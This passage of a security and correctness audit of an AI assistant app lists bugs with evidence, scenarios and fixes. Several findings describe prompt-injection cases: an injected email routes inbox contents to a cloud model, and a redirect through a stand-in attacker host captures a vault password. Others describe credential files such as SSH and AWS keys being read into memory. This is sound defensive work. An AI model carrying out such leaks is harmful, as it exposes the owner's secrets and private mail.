- problem: `_probe_backend` GETs `base_url + "/models"`. The configured Ollama base URLs end in `/v1`, so `/v1/models` works, but the fallbacks pass the bare root `http://127.0.0.1:11434`, giving `/models` (Ollama serves `/v1/models` and `/api/tags`, not `/models`). That is an HTTP 404; urlopen raises HTTPError (a URLError subclass), which is caught and returned as False. The `200 <= resp.status < 500` upper bound is also dead for the same reason: every 4xx raises instead of returning.
- evidence: `if not _probe_backend(local_url, timeout=timeout):` with `local_url = "http://127.0.0.1:11434"`
- scenario: pool of NVIDIA/Ollama-Cloud accounts exhausted mid-turn; dispatch.py calls probe_ollama_fallback expecting a local fallback, always gets None, and the turn keeps failing against the dead pool. Likewise a remote OLLAMA_BASE_URL going down never falls back to local because line 75 always returns False (and cfg.base_url ends in /v1 so `!= "http://127.0.0.1:11434"` is always true, which re-probes the same host).
- fix: probe `http://127.0.0.1:11434/api/tags` (or append `/v1`) and treat HTTPError with code < 500 as reachable.

### P4-40 [medium] LocalFallbackMemoryStore lacks ingest_session_file, ingest_vault, delete, save_embedding and get_embeddings, so with DOURMOUSE_MEMORY_REMOTE_URL set those calls raise AttributeError (swallowed in chat)
- where: dourmouse/memory_store.py:666-778 (opened by learn.py:94-112)
- problem: learn.open_default_store returns a LocalFallbackMemoryStore when a remote URL is configured, but the class implements only remember/search/count/get/all_facts/close (verified by comparing public method names with MemoryStore). RemoteMemoryStore's own comment describes this exact bug class ("implementing 4 of 12 public methods").
- evidence: `self.memory.ingest_session_file(self.session_file)` in chat.py is wrapped in `except Exception: pass`, which hides the AttributeError
- scenario: on the real remote-memory configuration the post-turn session ingest never runs (silently), deleting a fact or ingesting an Obsidian vault via the memory tools crashes, and semantic recall cannot cache embeddings.
- fix: add the five methods, delegating to local (or raising the typed unsupported error) as RemoteMemoryStore does.

### P4-43 [medium] apply_unified_diff inserts pure-addition hunks one line too early
- where: dourmouse/patch_apply.py:173-184
- problem: for a hunk with no old lines (`@@ -N,0 +M,K @@`, what `diff -U0` and many model diffs produce) the unified-diff convention is that N is the line AFTER WHICH the text goes. `_find_hunk_position` returns `hunk.old_start - 1` (0-based index N-1), i.e. before line N, so the inserted lines land one line above where the diff says.
- evidence: `return hunk.old_start - 1 if hunk.old_start >= 1 else 0`
- scenario: reproduced: file a,b,c with the diff `@@ -2,0 +3 @@ / +X` (exactly what `diff -U0` prints for inserting X after b) yields `a X b c` instead of `a b X c`; the syntax check passes for most files, so a misplaced line is written silently (inside a function body or between decorators it may still parse).
- fix: use index `old_start` when `old_lines` is empty (insert after line N); keep `0` for `old_start == 0`.

### P4-44 [medium] Both patch appliers read with errors="replace" and rewrite the whole file, so untouched bytes change (invalid UTF-8 becomes U+FFFD, CRLF becomes LF)
- where: dourmouse/patch_apply.py:87, 121, 209, 238
- problem: the module promises exactness ("restored to its exact original bytes", "atomic"), but a successful apply does `read_text(encoding="utf-8", errors="replace")` (universal-newline decoding) and `write_text(...)`. Any byte that is not valid UTF-8 anywhere in the file is permanently replaced by U+FFFD, and every CRLF line ending is rewritten as LF, even though the patch touched one line (both reproduced).
- evidence: `original = path.read_text(encoding="utf-8", errors="replace")` then `path.write_text(working, encoding="utf-8")`
- scenario: the model patches one line of a latin-1 source file or a Windows-style CRLF file; the diff in git shows every line changed or `café` turned into `caf�`, with no warning in the tool result.
- fix: read bytes, refuse (or use surrogateescape) when decoding fails, and preserve the file's newline style (`newline=""` on read and write).

### P4-46 [medium] iter_source_files skips every file when the repo root itself sits under a directory named build, dist, target, node_modules, venv and so on
- where: dourmouse/repo_map.py:179-183
- problem: the skip test runs over `p.parts` of the absolute path, which includes the ancestors of `root`, not just the part below it. A project checked out at `/Users/x/build/proj` or `/Volumes/dist/proj` gets every file filtered out (reproduced: `iter_source_files(Path('/tmp/rm_t/build/proj'))` returned `[]` for a tree with a real `a.py`).
- evidence: `if any(part in _SKIP_DIRS or part.endswith(".egg-info") for part in p.parts):`
- scenario: the model asks for a repo map of a project that lives under ~/build/ or a "target" folder; the answer is "no supported source files", which looks like an empty repo.
- fix: test `p.relative_to(root).parts`.

### P4-48 [medium] atlas_repo_scan takes any directory from the model, ungated, and stores json/yaml/toml/ini/cfg/txt/html/csv contents (credentials included) in long-term memory
- where: dourmouse/repo_index.py:415-427, 114-131, 177-181 (tool spec at 528-543)
- problem: `path` is only checked to be a directory (`~` and absolute paths allowed). `_collect_files` excludes only a few directory names and the exact file names `.env`/`.env.example`, so files such as `credentials.json`, `secrets.yaml`, `config.toml`, `.aws`-style INI/CFG files, exported `*.json` tokens are read (up to 512 KB each) and written to the memory DB. Memory recall (`learn.recall_block`) injects stored facts into later prompts, which go to cloud models. There is no confirmation and no DLP redaction on this path.
- evidence: `root = Path(raw).expanduser().resolve()` then `if not root.is_dir(): return ...`
- scenario: a prompt-injected or merely over-eager model calls atlas_repo_scan with path "~" or "~/Library/Application Support/..."; token files and config with API keys become searchable facts, are recalled into unrelated chats and leave the machine in a model request.
- fix: confine `path` to configured project roots, run DlpFilter over digests, and skip files whose names match credential/secret patterns.

### P4-51 [medium] research_mesh_qualify resumes a half-finished agent with a brand-new RealBrain that has studied nothing, so later exams fail and can permanently exclude the agent
- where: dourmouse/research_mesh_tools.py:110-124 (with research_mesh/pipeline.py step(), research_mesh/brain.py:186-213)
- problem: the record (status, dossier, passed iterations, attempts) is persisted and resumed, but the brain's knowledge lives only in the `RealBrain` instance (`_facts`, `_concepts`), which is created fresh on every call. The pipeline only calls `study()` in the UNLEARNED branch, so any call that starts from READY, TESTING, FAILED, REMEDIATING or PASSED (for example after an INCOMPLETE max_steps return, a crash, or a second call) answers exams with "(nothing studied yet)". Failures count toward MAX_ATTEMPTS and `exclude()` marks the agent NOT_QUALIFIED permanently.
- evidence: `pipe = QualificationPipeline(store, RealBrain(), corpus)`
- scenario: the first call hits `max_steps` after studying and passing two papers and returns INCOMPLETE; the owner calls research_mesh_qualify again, the third paper is taken with an empty brain, fails three times, and the field-agent is permanently NOT_QUALIFIED although nothing was wrong with the agent.
- fix: re-run (or restore) the study step into a new RealBrain whenever the record is not UNLEARNED (study material is deterministic from the corpus and the record's held_out list), or persist the brain's facts.

### P4-52 [medium] The answer critic is blind to negation: "not" and "no" are stopwords, so a sentence that states the opposite of a stored claim scores as SUPPORTED
- where: dourmouse/research_pipeline/answer_critic.py:63-69, 236-247, 407-409
- problem: `_STOPWORDS` contains `no` and `not`, and `_tokens` drops stopwords, so "X does not reduce Y" and "X reduces Y" have identical content-word sets. `_coverage` then returns 1.0, and the deterministic core marks the sentence SUPPORTED with the stored claim's id as evidence. Only numbers are guarded (every number must match), polarity is not. The model-adjudicated path has the same gap: a verbatim 3-word quote such as "does not reduce the" shares two content words with the sentence and passes `_verify_quote`.
- evidence: `"... no not of on or our over ..."` inside `_STOPWORDS`
- scenario: reproduced: with the stored claim "Vitamin D supplementation does not reduce the risk of fractures in adults.", the answer sentence "Vitamin D supplementation reduces the risk of fractures in adults." gets coverage 1.0 and 6 matched words, so the critic reports it SUPPORTED, which is exactly the false claim the critic exists to catch.
- fix: keep negation tokens (not, no, never, without, cannot, n't forms) as content words, or compare a negation flag between sentence and evidence and demote on mismatch.

### P4-53 [medium] Browser history reader copies every Chromium "Default/History" to the same temp name, so another browser's leftover -wal file can be applied to the next database
- where: dourmouse/security/browser_history.py:48-57, 111-116
- problem: the temp copy is named `<parent dir name>-<db name>`; for Chrome, Brave, Edge and Arc the history file sits in a directory called `Default`, so each browser's copy is `Default-History` in the same temp folder. `_copy_and_open` copies the `-wal`/`-shm` sidecars only when they exist and never deletes sidecars left by the previous browser. If the earlier browser was running (has a WAL) and the next one is closed (no WAL), SQLite opens the new copy together with the stale `Default-History-wal` of a different database and replays foreign pages into it.
- evidence: `dest = tmp / (db.parent.name.replace(" ", "_") + "-" + db.name)`
- scenario: Chrome is open and Brave is not; the Brave read returns garbage rows or "database disk image is malformed" (reported as "unreadable"), so visits to blocked domains in Brave are missed, or Chrome's visits are attributed to Brave.
- fix: include the browser name in the temp file name, or give each source its own temp subdirectory.

### P4-54 [medium] DownloadsWatcher never forgets a file name, so a re-downloaded or replaced file with a name seen before is never assessed, and a download paused for one poll is assessed half-written and never again
- where: dourmouse/security/downloads.py:239-274
- problem: `_seen` is only ever added to (including at priming). Any later file whose name equals an earlier one (the first file was deleted, moved, or overwritten, e.g. `setup.dmg`, `invoice.pdf`, `download.zip`) is skipped by `if name in self._seen`. Separately, "ready" means the size was identical across two polls 2 s apart, with no in-progress suffix; a stalled `curl -o`/slow transfer satisfies this, is assessed and hashed in its partial state, then marked seen, and the finished file is not assessed.
- evidence: `if name in self._seen: continue` with `self._seen.add(name)` the only mutation after priming
- scenario: an attacker-supplied `report.pdf.app`/`update.dmg` is downloaded under a name that appeared (and was removed) earlier in the session; the watcher stays silent, defeating the sentry's alert.
- fix: key the seen set on (name, inode, mtime, size) and drop entries whose file no longer exists; re-assess when mtime or size changes after assessment.

### P4-55 [medium] Several "monitoring" indicators discard the command's success flag and report ABSENT (high confidence) when the check could not run
- where: dourmouse/security/monitoring.py:152-162 (trust settings), 173-179 (system extensions), 191-198 (running processes); also 142-150
- problem: the module's contract is "PRESENT, ABSENT or UNKNOWN ... The analyzer never guesses". `mt._run` returns `(False, "<cmd> timed out ...")` or `(False, "<cmd> is not available ...")` on a timeout, a missing binary or a start failure, but for `security dump-trust-settings`, `systemextensionsctl list` and `ps` the code assigns `_` to the flag and parses the error text as if it were output. The result is `ABSENT` with confidence "high for user and admin trust settings" / "high: listed by macOS", e.g. "no user- or admin-added certificate trust settings". The VPN indicator likewise turns a failed `scutil --nc list` into "no VPN configured".
- evidence: `_, out = mt._run(args)` followed by `if "No Trust Settings were found" not in out: roots.extend(...)` and `_, out = mt._run(["systemextensionsctl", "list"])`
- scenario: `security dump-trust-settings` times out on a loaded Mac (or is denied); the page tells the owner no extra root certificates are trusted, a false all-clear for the very TLS-interception check it advertises.
- fix: when `ok` is False and the output lacks the expected "no settings" marker, emit an UNKNOWN indicator with the error text.

### P4-57 [medium] A finding is "new" only the first time it has ever been seen, so a recurrence (firewall switched off again, a device or exposed port that returns, the same malicious file re-downloaded) never alerts, wakes the analyst, or correlates
- where: dourmouse/security/sentry.py:352-378, 678-702 (and downloads.py:326)
- problem: `seen_findings` is permanent and has no "cleared" state. `record_and_classify` returns "new" only when the fingerprint has no row; every later detection of the same condition, however long after it disappeared, returns "known". Alerts (`_write_alert`), `new_findings` (which drive `Analyst.should_wake` and `_detect_correlations`) and risky-download alerts all key on "new". Fingerprints are stable per condition (`_fingerprint("firewall_disabled")`, command+port+protocol, MAC, file sha).
- evidence: `return "dismissed" if dismissed else "known"` for any existing row
- scenario: the owner re-enables the firewall after the first alert; malware (or a later update) disables it again a week later: the scan lists it as an ordinary known finding, writes no alert, and the analyst never wakes. Same for a stranger's device that joined, left and came back.
- fix: record when a finding was last absent (clear it on a scan that no longer detects it, or compare `last_seen` with the previous scan time) and treat reappearance after absence as "new".

### P4-6 [medium] Drive ingest records every failed download as "skipped_no_text" and marks it done permanently
- where: dourmouse/bulk_ingest.py:296-298, 328-339
- problem: `_read_drive_file_text` catches Exception and returns None, which the caller counts as `skipped_no_text` and adds to `done` (the checkpoint). Network errors, 401 after token expiry, 403 rate limits and 5xx are indistinguishable from "no text", never increment `errors`, and are never retried on re-run.
- evidence: `except Exception:  # noqa: BLE001 — one bad Drive file must never kill the run` then `return None`
- scenario: the access token expires one hour into a large Drive ingest; every remaining file raises 401, is counted as no-text, checkpointed done, and the run ends "successfully" with errors=0. Re-running skips them all, so those files are never indexed. Contradicts the module claim that every skip is counted honestly.
- fix: let transport/auth errors propagate to the caller's `except` (counted in `errors`, not added to `done`), only return None for genuinely non-text types.

### P4-60 [medium] The paper-log rewrite is non-atomic, treats a failed read as an empty log, and crashes on a short or malformed row
- where: dourmouse/tradingview_ops.py:296-329, 393-424
- problem: `route_to_paper` reads all rows, modifies them and rewrites the whole CSV with `open(path, "w")` (truncate then write). (a) `_read_paper_rows` returns `[]` on any OSError, so a transient read failure followed by a successful write replaces the entire paper history with the one new row. (b) The truncate-and-write is not atomic and `_PAPER_LOCK` is only an in-process mutex, while the same file is edited by `scripts/paper_log.py` (run by atlas_command) and by other writers, so a crash or a concurrent writer loses rows. (c) On close, `float(r[4])` and `r[6]..r[10]` are indexed without validation: a row with fewer than 11 columns raises IndexError, a bad or zero entry price raises ValueError/ZeroDivisionError, although handle_tv_webhook promises "Always returns a dict (never raises)"; `price` accepts `nan`/`inf` strings (`float("nan") <= 0` is False) and writes them.
- evidence: `except OSError: return []` in `_read_paper_rows`, then `rows.append(row)` / `_rewrite_paper_rows(rows)`
- scenario: the paper log is briefly unreadable while a sync tool holds it; an "open" alert arrives and the log is rewritten containing only that row; or an external script appended a short row and the next "close" alert answers HTTP 500 and never closes the position.
- fix: on read failure refuse to write; write to a temp file plus os.replace under an inter-process lock; validate row length and numbers; reject non-finite prices.

### P4-62 [medium] worldmonitor_call_tool uses the 3 s probe timeout for real data calls, and the catalog check adds a second network round trip to every call
- where: dourmouse/worldmonitor.py:126-131, 197-209, 239
- problem: `_client(transport=None, timeout=None)` does `timeout or _PROBE_TIMEOUT`, so `_client().call_tool(name, args)` runs with a 3 s timeout. The comment says the SDK's 30 s default "is reserved for real data calls", but nothing passes it. Heavy tools (analyze_situation, generate_forecasts, search_flights, get_world_brief) routinely need longer and fail as "World Monitor ... failed: timed out". In addition every call first runs `_is_known_tool`, which fetches the full live catalog (another 3 s-capped request) before the real call.
- evidence: `return Client(transport=transport, timeout=timeout or _PROBE_TIMEOUT)` and `result = _client().call_tool(name, args)`
- scenario: the model asks for a forecast or flight search; the data call is cut off at 3 s every time, reported as an upstream failure, so the tool looks permanently broken.
- fix: pass `timeout=30.0` (the SDK default) for call_tool and cache the catalog for a few minutes.

### P4-66 [medium] atlas_proposals resolves its default workspace to dourmouse/workspace (inside the package) instead of the real <repo>/workspace, which is where the run directories in this group came from
- where: dourmouse/atlas/atlas_proposals.py:109-114 (evidence files: dourmouse/workspace/atlas_lab/tmp/run_*/harness.py and strategy_module.py)
- problem: the module moved into the `dourmouse/atlas/` subpackage, but `_workspace_root()` still computes `Path(__file__).resolve().parent.parent / "workspace"`, which is now `dourmouse/workspace`. config.workspace_dir(), sandbox.py and general_roster resolve `<repo>/workspace`. As a result proposals.json, run records and the model-written strategy/harness files live in a second, unrelated tree (22 run directories exist under dourmouse/workspace/atlas_lab/tmp). Dourmouse's own protections name the other tree: sandbox `_PROTECTED_WORKSPACE_DIRS` and the file-tool protected list refer to `<repo>/workspace/atlas_lab`, and the run directory sits inside `<repo>/dourmouse`, which the sandbox profile denies for writes.
- evidence: `root = Path(raw).expanduser() if raw else Path(__file__).resolve().parent.parent / "workspace"`
- scenario: DOURMOUSE_WORKSPACE unset (the default install): ATLAS lab proposals disappear from any tool or UI that reads `<repo>/workspace/atlas_lab`, the workspace backup/export and protection rules do not cover them, and generated code is written into the application's own source directory.
- fix: use `dourmouse.config.workspace_dir()` (same single resolver as every other module); the same wrong-root pattern exists in atlas_ui_ops.py (P4-3).

### P4-9 [medium] browser_signin fills the stored password into whatever page the navigation lands on, and accepts plain http
- where: dourmouse/browser_agent.py:1961-2005
- problem: credentials are looked up by the netloc of the requested `site`, but after `page.goto(site)` the code never checks that `page.url` is still on that host (or https) before filling `input[type=password]`. A redirect (open-redirect path on the site, or an http URL that is hijacked or redirected) sends the vault password into a foreign login form. `site` may carry any path and query, which the model chooses.
- evidence: `await pw_loc.first.fill(creds["password"], timeout=8_000)` right after `await page.goto(site, ...)`
- scenario: model (steered by page content or a prompt-injection) calls browser_signin with `bank.com/redirect?u=https://evil.example/login`; the owner approves "sign in to bank.com", the page bounces to evil.example, and the bank password is typed into the attacker's form (or sent in clear over http://).
- fix: after goto, require `urlparse(page.url).hostname` equal to the vault host and scheme https before filling; refuse otherwise.

### P5-11 [medium] check_frameable treats frame-ancestors 'self' as embeddable
- where: dourmouse/browser_pane.py:90-110
- problem: 'self' in a site's frame-ancestors means the SITE's own origin, not ours, so such a page cannot be framed by the console. The code counts any source list containing '*' or 'self' as allowing us, which is the exact blank-iframe case this function exists to catch. The later `sources == ["'none'"]` branch is unreachable (the earlier branch already returns for it).
- evidence: `if sources and not any(s in ("*", "'self'") for s in sources):`
- scenario: github.com-style `frame-ancestors 'self'` -> reported frameable True, iframe stays blank, the proxy fallback is never offered.
- fix: only '*' (or an explicit match of our origin) allows framing; treat 'self'/'none'/other hosts as blocked.

### P5-13 [medium] Device wiki walker follows symlinks and indexes secret files, then sends them to the model
- where: dourmouse/device_wiki/walker.py:85-96 (consumer device_wiki/stages.py read_file_for_summary)
- problem: the module promises an explicit root allowlist, but files are taken with Path.stat()/open() which follow symlinks, so a symlink inside a root pointing at ~/.ssh/id_rsa, ~/.aws/credentials or any file outside the root is hashed, stored by its in-root path, and later read in full and sent to the summarizer. There is also no exclusion of secret-bearing names (.env files in a non-dot directory, *.pem, id_rsa, credentials.json, *.kdbx) even inside the roots; only directory names starting with "." are skipped.
- evidence: `fpath.stat().st_size` / `found[str(fpath)] = (content_hash, size)`
- scenario: DOURMOUSE_WIKI_ROOTS=~/Documents containing a `notes/key.pem` or a symlink to ~/.aws/credentials: the content is posted to the cloud model as "file content" and the summary can echo it.
- fix: skip is_symlink() files and files whose resolved path is outside the root; add a denylist of secret filenames/extensions.

### P5-15 [medium] Receipt total picks the Subtotal line
- where: dourmouse/extract.py:93-100
- problem: the label "total" is matched with no word boundary, so "Subtotal $10.00" (which normally precedes the real total) matches first and its amount is reported as the receipt total; finditer returns matches in text order and the loop breaks at the first hit for the first label.
- evidence: `for m in re.finditer(label + r"[^\n]*" + _CURRENCY, text, re.I):`
- scenario: text "Subtotal $10.00 / Tax $1.00 / Total $11.00" -> "total: $10.00" (verified), a wrong figure with only a generic "verify totals" note.
- fix: use `\b` before the label, exclude "sub", and prefer the last matching line.

### P5-18 [medium] auto_commit sweeps everything already staged into the "[dourmouse-auto]" commit, and undo_last then reverts it
- where: dourmouse/git_safety.py:130-140
- problem: docstring says it commits "exactly path", but it only `git add -- rel`, then runs a plain `git commit -m ...` with no pathspec, so any other changes the human had already staged are committed under the auto prefix. The "nothing staged" check also looks at the whole index (`diff --cached --name-only`), not at `rel`. undo_last trusts the prefix and reverts the whole commit, rolling back the human's staged work too.
- evidence: `commit = _run_git(["commit", "-m", subject, "--no-verify"], cwd=root)`
- scenario: user stages a refactor in the repo, the agent writes one file there: the refactor is committed as "[dourmouse-auto] wrote x"; "undo_last_change" later reverts the user's staged refactor along with the agent's edit.
- fix: `git commit -m subject --only -- <rel>` (or `git diff --cached --name-only -- rel` plus a pathspec commit).

### P5-19 [medium] ingest_corpus_file crashes on a non-object entry after validation already flagged it
- where: dourmouse/global_memory.py:326-328
- problem: validate_corpus_entry returns "entry is not an object" for a non-dict, but the rejection branch then calls `entry.get("id", "?")` on that same non-dict, raising AttributeError and aborting the whole bulk ingest with no per-row report (earlier rows were already written).
- evidence: `rejected.append({"id": str(entry.get("id", "?")), "reason": problem})`
- scenario: corpus JSON `[{"id":"a","text":"x"}, "stray string"]` -> AttributeError after row "a" is stored; caller gets no accepted/rejected summary.
- fix: `eid = entry.get("id", "?") if isinstance(entry, dict) else "?"`.

### P5-2 [medium] find_menu_item_ax raises IndexError on a path through a leaf item
- where: dourmouse/app_control_ax.py:309-310
- problem: `submenu_children = _menu_children(found)` can be [] (menu item with no submenu), then `submenu_children[0]` raises IndexError instead of the documented AXControlError "MENU ITEM NOT FOUND ...". Callers only catch AXControlError.
- evidence: `level_elements = submenu_children[0] and _menu_children(submenu_children[0]) or []`
- scenario: click_menu_item(app, ["File", "Close", "Foo"]) where "Close" is a plain item -> unhandled IndexError out of the tool handler.
- fix: `level_elements = _menu_children(submenu_children[0]) if submenu_children else []`.

### P5-23 [medium] record_utterance never re-checks the mic kill switch while recording
- where: dourmouse/hands_free.py:239-292 (contract in docstring lines 30-33)
- problem: the module promises every microphone open "is force-stopped the moment the kill switch flips off mid-listen or mid-record", but mic_allowed() is read once before the stream opens; the wait is a plain `done_evt.wait(timeout=max_ms/1000+5)` with no polling, and `_on_audio` keeps appending frames. The captured audio is then transcribed and sent to dispatch.
- evidence: `done_evt.wait(timeout=(seg.max_ms / 1000.0) + 5.0)`
- scenario: the user hits the tray kill switch 1s after saying the wake word; the mic keeps recording up to ~20s and the whole clip is still transcribed and acted on (only the spoken reply is skipped at line 449).
- fix: wait in short slices, check mic_allowed() each slice and in _on_audio, and return None (discarding frames) when it flips.

### P5-24 [medium] The whole hands-free turn runs inside the wake-word PortAudio callback, so stop()/kill switch block until the turn ends
- where: dourmouse/hands_free.py:415-425 (called from dourmouse/wakeword.py:337 inside _on_audio)
- problem: WakeWordListener invokes on_wake synchronously from the sounddevice input callback. HandsFreeController._on_wake then runs record (up to 15s) + STT + LLM dispatch + TTS + playback in that callback. The wake stream cannot deliver audio meanwhile (overflow), and WakeWordListener.stop() (also used by its kill-switch watchdog) calls stream.stop(), which waits for the running callback to return.
- evidence: `self._handle_turn()` inside `_on_wake`, itself called from `_on_audio`
- scenario: mic KILLED while a turn is mid-dispatch: the watchdog's stop() blocks until the whole turn finishes, so the kill switch is not effective for the duration of an LLM call.
- fix: have _on_wake hand the turn to a worker thread (start a daemon thread and return immediately), keeping the busy lock.

### P5-26 [medium] media_convert._run can deadlock on a full stderr pipe
- where: dourmouse/media_convert.py:127-136
- problem: ffmpeg is started with stdout=PIPE and stderr=PIPE, the code reads stdout line by line until EOF and only afterwards reads stderr. ffmpeg writes warnings to stderr during the run; if they exceed the pipe buffer (typical with "Non-monotonous DTS" or invalid-data spam on damaged mkv/avi), ffmpeg blocks on stderr, never closes stdout, and the loop never ends.
- evidence: `for line in proc.stdout:` ... `err = proc.stderr.read() if proc.stderr else ""`
- scenario: converting a slightly corrupt .avi: the job sits at "converting" forever, ffmpeg and its thread leak, the player never gets a result and no timeout exists.
- fix: redirect stderr to a temp file/DEVNULL or drain it in a thread, and add an overall timeout/kill.

### P5-27 [medium] Failed conversion/probe jobs are cached forever, and probe() runs under the global lock without catching its timeout
- where: dourmouse/media_convert.py:155-164, 121-146
- problem: any failure (ffmpeg missing at first call, a transient disk-full, a 60s probe timeout) is stored in _jobs[key] and returned on every later call because `_jobs.get(key)` is only None for first sight; there is no retry or expiry. probe() is called while holding _lock and does not catch subprocess.TimeoutExpired, so a slow network-mounted file raises out of ensure_playable and blocks other media requests for up to 60s.
- evidence: `job = _jobs.get(key)` / `if job is None:` (no handling of state == "failed")
- scenario: user opens an .mkv before installing imageio-ffmpeg, installs it, plays again: still "ffmpeg is not available" until the app restarts.
- fix: drop failed jobs from the cache (or retry after N seconds), run probe outside the lock, catch TimeoutExpired.

### P5-28 [medium] sidecar_subtitles glob uses the raw stem as a pattern and a bare prefix match
- where: dourmouse/media_convert.py:190
- problem: `glob(src.stem + "*")` interprets [ ] ? * in the file name as glob syntax, and matches any file that merely starts with the stem. Verified: "Movie [2020].mkv" finds no "Movie [2020].srt" (empty result), while "Matrix.mkv" also returns "Matrix Reloaded.srt" labelled "Reloaded".
- evidence: `for f in sorted(src.parent.glob(src.stem + "*")):`
- scenario: media files with bracketed release tags lose their subtitles; a movie picks up another film's subtitles.
- fix: use glob.escape(src.stem) and require the next char to be "." (or end).

### P5-3 [medium] send_keystrokes_ax types into whatever is frontmost, and silently truncates long text
- where: dourmouse/app_control_ax.py:429-436
- problem: activateWithOptions_ is asynchronous and no delay or frontmost check follows (the AppleScript path at least sleeps 0.3s); CGEventPost goes to the current key app. Also CGEventKeyboardSetUnicodeString only carries a limited number of UTF-16 units (Apple documents 20) per event, so longer text is cut while the function reports "TYPED ... N character(s)".
- evidence: `_Quartz.CGEventKeyboardSetUnicodeString(down, len(text), text)` then one single event pair for the whole string
- scenario: send_app_keystrokes("Notes", <long paragraph>) races focus (text lands in the previous app, e.g. a terminal or chat box) and/or only the first chunk is typed, yet success is reported.
- fix: wait until the target is frontmost (poll NSWorkspace.frontmostApplication) before posting, and send in chunks of <=20 UTF-16 units.

### P5-30 [medium] delegate()'s timeout is not enforced: the executor's with-block waits for every worker
- where: dourmouse/model_delegation.py:424-426 (also unused `timeout` in _run_local, line 251)
- problem: `concurrent.futures.wait(futures, timeout=timeout + 30)` returns after the timeout, but leaving the `with ThreadPoolExecutor` block calls shutdown(wait=True), which blocks until every task finishes, so the "timed out after Ns with no result" branch can never be reached and one stuck local model turn hangs delegate_to_models (and the calling turn) indefinitely. _run_local ignores its `timeout` argument entirely and run_dispatch_messages has no deadline.
- evidence: `with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:` ... `concurrent.futures.wait(futures, timeout=timeout + 30)`
- scenario: Ollama stalls on one of five delegated tasks: the other four answers are never returned and the chat turn never completes.
- fix: create the pool without `with`, wait with the timeout, then `pool.shutdown(wait=False, cancel_futures=True)`, and give _run_local a real deadline.

### P5-31 [medium] The task `model` field lets any agent's work bypass the "private agents stay local" policy
- where: dourmouse/model_delegation.py:400-403 (tool in dourmouse/general_roster.py:6823-6828)
- problem: the module's central guarantee is that mail/memory/files/finance agents are pinned local, but `backend = (task.model or "").strip().lower() or route_for(...)` takes the model-supplied "gemini" as-is before consulting the policy. delegate_to_models documents 'model' as a way to force a backend, and the model fills it in. A forced-cloud task is also run via _run_cloud, which ignores `agent` (no tools), so the prompt text, written by the model and possibly containing mail/memory content it has already read, goes to Google.
- evidence: `backend = (task.model or "").strip().lower() or route_for(`
- scenario: a prompt-injected email makes the model call delegate_to_models(tasks=[{agent:"mail", model:"gemini", prompt:"<inbox contents> summarise"}]).
- fix: apply `route_for(task.agent)` first and only allow `model` to move a task from cloud-eligible to local, never local-only to cloud.

### P5-32 [medium] classify() reports most non-listed HTTP error statuses as "offline"
- where: dourmouse/net_errors.py:78-102
- problem: for an urllib HTTPError with a status not in _kind_for_status (400, 402, 405, 408, 409, 418, 422, 451 ...) the code falls past the status check; HTTPError is a URLError subclass, so line 92 matches, its reason is a string, and the function returns OFFLINE ("I couldn't reach the network"). Verified: classify(HTTPError 400) and classify(HTTPError 408) both give ErrorKind.OFFLINE. The string form ("HTTP 400 from ...") instead falls to UNKNOWN, so the two shapes disagree.
- evidence: `return ErrorKind.OFFLINE` (final line of the URLError branch)
- scenario: a feed that answers 400/405 makes the roster tell the user the network is down and mark it retryable.
- fix: handle HTTPError before URLError (408 -> TIMEOUT, other 4xx -> UNKNOWN/PARSE) and return UNKNOWN for unrecognised reasons.

### P5-33 [medium] Node HTTP handlers only catch ValueError, so the documented "refusing to run a job" error (and any other OSError/RuntimeError) drops the connection with no response
- where: dourmouse/nodes/node_server.py:764-774 (also 713-743, 745-762)
- problem: JobRunner.submit raises RuntimeError("refusing to run a job: sandbox-exec ... unavailable ...") on a host without Seatbelt, and a non-object JSON body raises AttributeError (`spec.get`). do_POST catches only ValueError, so the exception escapes BaseHTTPRequestHandler, the traceback goes to stderr, and the client sees an empty reply. do_GET similarly catches only FileNotFoundError/ValueError, so asking for a directory under /jobs/<id>/artifacts/ raises IsADirectoryError and drops the connection. _body() also accepts a negative Content-Length (only `n > limit` is checked), and rfile.read(-1) then reads until the client closes.
- evidence: `except ValueError as exc:` / `self._json(400, {"error": str(exc)})` as the only handler in do_POST
- scenario: Dourmouse submits a job to a node without sandbox-exec: instead of the explicit refusal text it gets a connection reset and cannot tell why; an authenticated client sending `Content-Length: -1` pins a handler thread reading unbounded data.
- fix: catch RuntimeError/OSError/TypeError/AttributeError and return 4xx/5xx JSON; reject negative Content-Length; validate that the job spec is a dict.

### P5-38 [medium] personality_profile stores unparseable raw model output as the once-only profile
- where: dourmouse/personality_profile.py:183-197
- problem: when the reply is not the expected JSON (a reasoning-model scratchpad, a reply cut at max_tokens, a refusal) the raw text is stored verbatim as the profile and `has_profile()` then makes every later call return "already_generated" unless force=True. finish_reason is never checked, so a truncated "Now produce JSON... Let's craft:" scratchpad becomes the permanent profile (the exact failure the comment at 167-176 says was already fixed once). The raw path also bypasses the structural no-identifying-data guarantee the module docstring claims (that guarantee only exists for the JSON shape).
- evidence: `body = raw or "(model returned no content)"` followed by `store.remember(PROFILE_SOURCE, PROFILE_TITLE, body)`
- scenario: a slow/reasoning backend returns prose with names and project details; it is saved and injected into future context, and the one-time run cannot be repeated without force.
- fix: return {"ok": False, "reason": "unparseable_output"} (and do not store) when JSON parsing/required keys fail or finish_reason == "length".

### P5-39 [medium] ProactiveSurfacer swallows the first alert after launch (priming happens on the triggering event)
- where: dourmouse/proactive.py:281-313, wiring dourmouse/desktop.py:1068-1081
- problem: the module says the seen-set is "primed on the first refresh so launching the app never replays a backlog". But nothing calls refresh() at start-up: the surfacer is constructed and registered on the hub, and the first refresh only happens when the first alerts `state_change` event arrives. That fetch already contains the new alert, so the priming branch marks it seen and nothing is surfaced. (DesktopNotifier in desktop.py uses the same unprimed pattern.)
- evidence: `if not self._primed:` / `self._seen.add(aid)` / `continue`
- scenario: user launches the app, then the first ATLAS-run "system" alert fires: no popup (and no native notification) for it; only the second and later alerts surface.
- fix: call `surfacer.refresh()` once at construction (after the server is up) to prime, or prime from the ids present before the triggering event.

### P5-43 [medium] Citation gate accepts any short substring, so fabricated citations pass
- where: dourmouse/research_mesh/exams.py:79-81
- problem: a citation is "verified" if it is a substring of any known id/URL or if any known id/URL is a substring of it (`c in k or k in c`) with no minimum length or boundary. A fabricated citation such as "pdf", "http", "2019" or "a" is contained in some corpus filename/URL and passes; conversely a corpus paper whose id is short (e.g. "p1") verifies any citation that merely contains those characters. The module advertises the gate as the anti-hallucination spine that fails fabricated citations "no matter how good the prose is".
- evidence: `if not any(c and (c in k or k in c) for k in known):`
